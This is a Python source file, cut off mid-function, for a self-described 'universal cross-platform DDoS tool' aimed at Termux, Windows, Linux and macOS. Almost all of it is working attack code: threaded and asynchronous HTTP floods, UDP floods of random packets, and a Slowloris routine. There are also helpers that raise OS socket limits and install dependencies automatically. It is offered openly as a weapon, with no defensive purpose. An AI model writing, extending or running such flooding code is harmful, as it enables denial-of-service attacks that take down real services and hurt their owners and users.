#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# 🌐 UNIVERSAL CROSS-PLATFORM DDoS TOOL
# ⚠️  WORKS ON: Termux (Android), Windows, Linux, macOS ⚠️
# 💀 ULTIMATE DESTRUCTION - ANY DEVICE, ANY PLATFORM 💀
#

import sys
import os
import time
import socket
import threading
import random
import urllib.request
import urllib.parse
import http.client
import ssl
import subprocess
import ctypes
import struct
import asyncio
import aiohttp
import psutil
import ipaddress
import platform
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from multiprocessing import Process, cpu_count, Manager
from cryptography.fernet import Fernet
import hashlib
import zlib
import base64
import requests
import dns.resolver
import concurrent.futures

# =============================================================================
# CROSS-PLATFORM DETECTION & COMPATIBILITY
# =============================================================================
class CrossPlatform:
    def __init__(self):
        self.system = platform.system().lower()
        self.is_termux = self.detect_termux()
        self.is_mobile = self.is_termux
        self.is_root = self.check_privileges()
        self.arch = platform.machine()
        
    def detect_termux(self):
        """Detect if running on Termux (Android)"""
        try:
            if 'com.termux' in os.environ.get('PREFIX', '') or \
               os.path.exists('/data/data/com.termux/files/usr'):
                return True
        except:
            pass
        return False
    
    def check_privileges(self):
        """Check if running with elevated privileges"""
        try:
            if self.system == 'windows':
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def get_max_threads(self):
        """Get optimal thread count for platform"""
        if self.is_mobile:
            return min(500, cpu_count() * 8)  # Conservative for mobile
        elif self.system == 'windows':
            return min(2000, cpu_count() * 16)
        else:  # Linux/macOS
            return min(10000, cpu_count() * 32)
    
    def optimize_for_platform(self):
        """Apply platform-specific optimizations"""
        print(f"{UniversalColors.GREEN}[+] Platform: {self.system.upper()} | Mobile: {self.is_mobile} | Root: {self.is_root}{UniversalColors.END}")
        
        if self.is_termux:
            self.optimize_termux()
        elif self.system == 'windows':
            self.optimize_windows()
        elif self.system == 'linux':
            self.optimize_linux()
        elif self.system == 'darwin':  # macOS
            self.optimize_macos()

    def optimize_termux(self):
        """Termux-specific optimizations"""
        try:
            # Increase file limits for Termux
            os.system('ulimit -n 99999 2>/dev/null')
            # Disable IPv6 if problematic
            os.system('sysctl -w net.ipv6.conf.all.disable_ipv6=1 2>/dev/null')
            print(f"{UniversalColors.CYAN}[+] Termux optimizations applied{UniversalColors.END}")
        except:
            pass

    def optimize_windows(self):
        """Windows-specific optimizations"""
        try:
            import winreg
            # Network optimizations
            subprocess.run(['netsh', 'int', 'tcp', 'set', 'global', 'autotuninglevel=experimental'], 
                         capture_output=True, shell=True)
            print(f"{UniversalColors.CYAN}[+] Windows network stack optimized{UniversalColors.END}")
        except:
            pass

    def optimize_linux(self):
        """Linux-specific optimizations"""
        try:
            if self.is_root:
                os.system('sysctl -w net.core.rmem_max=134217728 2>/dev/null')
                os.system('sysctl -w net.core.wmem_max=134217728 2>/dev/null')
                os.system('sysctl -w net.ipv4.tcp_rmem="4096 87380 134217728" 2>/dev/null')
                os.system('sysctl -w net.ipv4.tcp_wmem="4096 65536 134217728" 2>/dev/null')
        except:
            pass

    def optimize_macos(self):
        """macOS-specific optimizations"""
        try:
            os.system('sysctl -w kern.ipc.maxsockbuf=16777216 2>/dev/null')
            os.system('sysctl -w net.inet.tcp.sendspace=1048576 2>/dev/null')
            os.system('sysctl -w net.inet.tcp.recvspace=1048576 2>/dev/null')
        except:
            pass

# =============================================================================
# UNIVERSAL COLOR SYSTEM
# =============================================================================
class UniversalColors:
    def __init__(self):
        self.enable_colors()
    
    def enable_colors(self):
        """Universal color support across all platforms"""
        plat = CrossPlatform()
        
        if plat.system == 'windows':
            try:
                os.system('color')
                import colorama
                colorama.init()
            except:
                self.disable_colors()
                return
        elif plat.is_termux:
            # Termux always supports colors
            pass
        
        # Define color codes
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.BLUE = '\033[94m'
        self.PURPLE = '\033[95m'
        self.CYAN = '\033[96m'
        self.WHITE = '\033[97m'
        self.BOLD = '\033[1m'
        self.BLINK = '\033[5m'
        self.REVERSE = '\033[7m'
        self.END = '\033[0m'
    
    def disable_colors(self):
        """Disable colors if not supported"""
        self.RED = self.GREEN = self.YELLOW = self.BLUE = ''
        self.PURPLE = self.CYAN = self.WHITE = self.BOLD = ''
        self.BLINK = self.REVERSE = self.END = ''

# Initialize colors globally
COLOR = UniversalColors()

# =============================================================================
# UNIVERSAL DEPENDENCY MANAGER
# =============================================================================
class DependencyManager:
    def __init__(self):
        self.platform = CrossPlatform()
        self.required_packages = [
            'requests', 'aiohttp', 'psutil', 'cryptography', 'fake_useragent'
        ]
        self.optional_packages = [
            'scapy', 'socks', 'stem', 'cloudscraper', 'dnspython'
        ]
    
    def check_dependencies(self):
        """Check and install missing dependencies"""
        print(f"{COLOR.YELLOW}[*] Checking dependencies...{COLOR.END}")
        
        missing = []
        for package in self.required_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                missing.append(package)
        
        if missing:
            print(f"{COLOR.RED}[!] Missing dependencies: {', '.join(missing)}{COLOR.END}")
            self.install_dependencies(missing)
        else:
            print(f"{COLOR.GREEN}[+] All required dependencies satisfied{COLOR.END}")
        
        # Check optional packages
        self.check_optional_packages()
    
    def install_dependencies(self, packages):
        """Install missing dependencies"""
        print(f"{COLOR.YELLOW}[*] Installing missing dependencies...{COLOR.END}")
        
        for package in packages:
            try:
                if self.platform.is_termux:
                    # Use pip for Termux
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                else:
                    # Use pip for other platforms
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                
                print(f"{COLOR.GREEN}[+] Installed: {package}{COLOR.END}")
            except Exception as e:
                print(f"{COLOR.RED}[!] Failed to install {package}: {e}{COLOR.END}")
    
    def check_optional_packages(self):
        """Check for optional packages"""
        missing_opt = []
        for package in self.optional_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                missing_opt.append(package)
        
        if missing_opt:
            print(f"{COLOR.YELLOW}[!] Optional packages missing: {', '.join(missing_opt)}{COLOR.END}")
            print(f"{COLOR.YELLOW}[!] Some advanced features will be disabled{COLOR.END}")

# =============================================================================
# MOBILE-FRIENDLY ATTACK VECTORS
# =============================================================================
class MobileAttackEngine:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.platform = CrossPlatform()
        self.stats = {
            'requests_sent': 0,
            'packets_sent': 0,
            'start_time': time.time(),
            'active_workers': 0
        }
        self.attack_active = True
    
    def mobile_http_flood(self, duration=300, workers=100):
        """Mobile-optimized HTTP flood"""
        print(f"{COLOR.RED}[MOBILE] Starting HTTP Flood with {workers} workers{COLOR.END}")
        
        user_agents = [
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
            'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950)',
        ]
        
        def http_worker(worker_id):
            self.stats['active_workers'] += 1
            end_time = time.time() + duration
            session = requests.Session()
            
            while time.time() < end_time and self.attack_active:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': '*/*',
                        'Connection': 'close'
                    }
                    
                    url = f"http://{self.target}:{self.port}/"
                    response = session.get(url, headers=headers, timeout=5)
                    self.stats['requests_sent'] += 1
                    
                except:
                    self.stats['requests_sent'] += 1  # Count failed attempts too
            
            self.stats['active_workers'] -= 1
            session.close()
        
        # Start workers
        threads = []
        for i in range(min(workers, 200)):
            t = threading.Thread(target=http_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor
        start_time = time.time()
        while time.time() < start_time + duration:
            elapsed = time.time() - start_time
            rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
            print(f"{COLOR.GREEN}📱 Mobile RPS: {rps:.0f} | Total: {self.stats['requests_sent']:,}{COLOR.END}")
            time.sleep(2)
        
        self.attack_active = False
        for t in threads:
            t.join()
    
    def mobile_udp_flood(self, duration=300, workers=50):
        """Mobile-optimized UDP flood"""
        print(f"{COLOR.RED}[MOBILE] Starting UDP Flood with {workers} workers{COLOR.END}")
        
        def udp_worker(worker_id):
            self.stats['active_workers'] += 1
            end_time = time.time() + duration
            
            while time.time() < end_time and self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    # Smaller payloads for mobile
                    payload = os.urandom(random.randint(64, 512))
                    
                    for _ in range(10):  # Multiple packets per socket
                        sock.sendto(payload, (self.target, self.port))
                        self.stats['packets_sent'] += 1
                    
                    sock.close()
                except:
                    pass
            
            self.stats['active_workers'] -= 1
        
        # Start workers
        threads = []
        for i in range(min(workers, 100)):
            t = threading.Thread(target=udp_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor
        start_time = time.time()
        while time.time() < start_time + duration:
            elapsed = time.time() - start_time
            pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            print(f"{COLOR.GREEN}📱 Mobile PPS: {pps:.0f} | Total: {self.stats['packets_sent']:,}{COLOR.END}")
            time.sleep(2)
        
        self.attack_active = False
        for t in threads:
            t.join()
    
    def mobile_slowloris(self, duration=300, sockets=100):
        """Mobile-optimized Slowloris"""
        print(f"{COLOR.RED}[MOBILE] Starting Slowloris with {sockets} sockets{COLOR.END}")
        
        slow_sockets = []
        
        # Create sockets
        for i in range(min(sockets, 200)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target, self.port))
                
                # Send partial request
                partial = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode()
                s.send(partial)
                slow_sockets.append(s)
                
            except:
                continue
        
        print(f"{COLOR.GREEN}[MOBILE] {len(slow_sockets)} sockets connected{COLOR.END}")
        end_time = time.time() + duration
        
        # Maintain sockets
        while time.time() < end_time and self.attack_active and slow_sockets:
            for s in list(slow_sockets):
                try:
                    # Send keep-alive headers
                    keep_alive = f"X-{random.randint(1000,9999)}: {random.randint(1000,9999)}\r\n".encode()
                    s.send(keep_alive)
                except:
                    slow_sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
            
            print(f"{COLOR.CYAN}[MOBILE] Active sockets: {len(slow_sockets)}{COLOR.END}")
            time.sleep(15)
        
        # Cleanup
        for s in slow_sockets:
            try:
                s.close()
            except:
                pass
    
    def launch_mobile_assault(self, duration=300):
        """Launch all mobile-optimized attacks"""
        print(f"{COLOR.RED}{COLOR.BLINK}")
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                   📱 MOBILE ASSAULT 📱                     ║")
        print("║               OPTIMIZED FOR MOBILE DEVICES                 ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print(f"{COLOR.END}")
        
        attacks = [
            ('HTTP FLOOD', lambda: self.mobile_http_flood(duration, 150)),
            ('UDP FLOOD', lambda: self.mobile_udp_flood(duration, 80)),
            ('SLOWLORIS', lambda: self.mobile_slowloris(duration, 120)),
        ]
        
        threads = []
        for name, attack in attacks:
            t = threading.Thread(target=attack, name=name)
            t.daemon = True
            t.start()
            threads.append(t)
            print(f"{COLOR.GREEN}[+] {name} STARTED{COLOR.END}")
        
        # Monitor
        start_time = time.time()
        while time.time() < start_time + duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            total = self.stats['requests_sent'] + self.stats['packets_sent']
            
            print(f"{COLOR.CYAN}")
            print(f"📱 Mobile Assault: {remaining:.0f}s remaining")
            print(f"📊 Total Attacks: {total:,}")
            print(f"👥 Active Workers: {self.stats['active_workers']}")
            print(f"{COLOR.END}")
            
            time.sleep(5)
        
        self.attack_active = False
        for t in threads:
            t.join()

# =============================================================================
# UNIVERSAL ATTACK ENGINE
# =============================================================================
class UniversalAttackEngine:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.platform = CrossPlatform()
        self.stats = Manager().dict()
        self.stats.update({
            'total_packets': 0,
            'total_requests': 0,
            'total_bytes': 0,
            'start_time': time.time(),
            'active_attacks': 0
        })
        self.attack_active = True
        
        # Platform-specific limits
        if self.platform.is_mobile:
            self.max_threads = 200
            self.max_workers = 300
        else:
            self.max_threads = 2000
            self.max_workers = 5000
    
    def universal_http_flood(self, duration=300, workers=None):
        """Universal HTTP flood for all platforms"""
        if workers is None:
            workers = self.max_workers // 2
        
        workers = min(workers, self.max_workers)
        print(f"{COLOR.RED}[HTTP] Starting Universal HTTP Flood with {workers} workers{COLOR.END}")
        
        async def http_worker(session, worker_id):
            end_time = time.time() + duration
            
            while time.time() < end_time and self.attack_active:
                try:
                    headers = {
                        'User-Agent': f'Nightmare-Bot-{random.randint(1000,9999)}',
                        'Accept': '*/*',
                        'Connection': 'close'
                    }
                    
                    url = f"http://{self.target}:{self.port}/"
                    async with session.get(url, headers=headers, ssl=False, timeout=5) as response:
                        await response.read()
                        self.stats['total_requests'] += 1
                        
                except:
                    self.stats['total_requests'] += 1
        
        async def run_http_attack():
            connector = aiohttp.TCPConnector(limit=0, limit_per_host=0)
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for i in range(workers):
                    task = asyncio.create_task(http_worker(session, i))
                    tasks.append(task)
                
                # Monitoring
                start_time = time.time()
                while time.time() < start_time + duration:
                    elapsed = time.time() - start_time
                    rps = self.stats['total_requests'] / elapsed if elapsed > 0 else 0
                    print(f"{COLOR.GREEN}🌐 Universal RPS: {rps:.0f} | Total: {self.stats['total_requests']:,}{COLOR.END}")
                    await asyncio.sleep(2)
                
                await asyncio.gather(*tasks)
        
        asyncio.run(run_http_attack())
    
    def universal_udp_flood(self, duration=300, threads=None):
        """Universal UDP flood for all platforms"""
        if threads is None:
            threads = self.max_threads // 2
        
        threads = min(threads, self.max_threads)
        print(f"{COLOR.RED}[UDP] Starting Universal UDP Flood with {threads} threads{COLOR.END}")
        
        def udp_worker(worker_id):
            end_time = time.time() + duration
            
            while time.time() < end_time and self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.s
